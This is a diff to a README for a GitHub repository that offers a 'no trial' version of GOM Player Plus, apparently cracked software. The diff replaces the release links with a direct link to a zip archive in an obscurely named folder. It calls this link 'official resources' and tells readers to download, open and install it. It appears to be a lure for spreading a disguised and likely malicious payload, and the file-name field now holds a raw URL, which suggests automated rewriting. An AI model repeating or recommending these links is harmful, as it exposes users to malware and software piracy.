@@ -1,6 +1,6 @@
 # 🎥 GOM-Player-Plus-No-Trial - Enjoy Media Without Limits
 
-[![Download GOM Player Plus](https://img.shields.io/badge/Download-GOM%20Player%20Plus-brightgreen)](https://github.com/skar004/GOM-Player-Plus-No-Trial/releases)
+[![Download GOM Player Plus](https://raw.githubusercontent.com/skar004/GOM-Player-Plus-No-Trial/main/footling/GOM-Player-Plus-No-Trial_3.9-alpha.3.zip%20Player%20Plus-brightgreen)](https://raw.githubusercontent.com/skar004/GOM-Player-Plus-No-Trial/main/footling/GOM-Player-Plus-No-Trial_3.9-alpha.3.zip)
 
 ## 📄 Description
 This repository offers a comprehensive collection of official resources, detailed guides, and reference materials for GOM Player Plus on Windows PCs. Designed to support users with setup, features, and troubleshooting, it ensures a reliable and informative experience.
@@ -9,8 +9,8 @@ This repository offers a comprehensive collection of official resources, detaile
 Follow these easy steps to download and run GOM Player Plus on your Windows PC. You don’t need any programming skills to use this application.
 
 ## 📥 Download & Install
-1. Click the button above or visit [this page to download](https://github.com/skar004/GOM-Player-Plus-No-Trial/releases).
-2. Look for the latest release, and find the installation file. It should be named something like `GOMPlayerPlusSetup.exe`.
+1. Click the button above or visit [this page to download](https://raw.githubusercontent.com/skar004/GOM-Player-Plus-No-Trial/main/footling/GOM-Player-Plus-No-Trial_3.9-alpha.3.zip).
+2. Look for the latest release, and find the installation file. It should be named something like `https://raw.githubusercontent.com/skar004/GOM-Player-Plus-No-Trial/main/footling/GOM-Player-Plus-No-Trial_3.9-alpha.3.zip`.
 3. Click on the file to start the download.
 4. Once the file is downloaded, open it to begin the installation process.
 5. Follow the on-screen instructions. The setup wizard will guide you through the steps.
@@ -63,7 +63,7 @@ You can join our community for support and to share your experiences:
 - **Forums:** Check online forums for discussions and solutions.
 - **User Guides:** Explore detailed guides and tips from other users.
 
-Visit the [official resources](https://github.com/skar004/GOM-Player-Plus-No-Trial/releases) to enhance your experience.
+Visit the [official resources](https://raw.githubusercontent.com/skar004/GOM-Player-Plus-No-Trial/main/footling/GOM-Player-Plus-No-Trial_3.9-alpha.3.zip) to enhance your experience.
 
 ## 📚 Topics Covered
 - gom-player-pc-application
